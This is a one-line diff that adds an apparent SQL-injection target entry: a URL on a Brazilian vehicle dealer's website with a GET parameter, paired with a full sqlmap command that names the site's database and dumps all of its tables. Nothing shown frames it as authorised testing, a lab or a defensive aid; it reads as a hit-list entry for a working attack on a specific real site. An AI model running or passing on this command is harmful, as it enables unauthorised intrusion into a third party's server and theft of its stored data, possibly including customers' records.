@@ -1,0 +1,1 @@
+http://www.andreiveiculos.com.br/veiculos.php?marca=29 (GET)  # sqlmap.py -u http://www.andreiveiculos.com.br/veiculos.php?marca=29 -D andreive_bd --tables --dump-all --threads 5 -v3
